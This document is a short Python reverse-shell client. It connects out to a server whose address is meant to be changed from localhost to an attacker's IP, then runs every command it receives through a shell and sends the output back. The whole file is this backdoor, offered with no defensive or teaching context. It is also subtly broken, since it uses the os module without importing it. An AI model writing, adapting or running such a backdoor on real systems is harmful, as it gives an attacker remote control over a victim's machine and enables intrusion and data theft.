import socket
import subprocess

def connect_to_server():
    s = socket.socket()
    host = 'localhost'  # Change this to the server's IP address
    port = 9999  # Make sure this matches the server's port
    s.connect((host, port))
    receive_commands(s)
    s.close()

def receive_commands(s):
    while True:
        data = s.recv(1024)
        if data[:2].decode("utf-8") == 'cd':
            # Change directory command
            os.chdir(data[3:].decode("utf-8"))
        if len(data) > 0:
            # Execute the command and get the output
            cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output_bytes = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_bytes, "utf-8")
            s.send(str.encode(output_str + str(os.getcwd()) + '> '))

def main():
    connect_to_server()

if __name__ == "__main__":
    main()
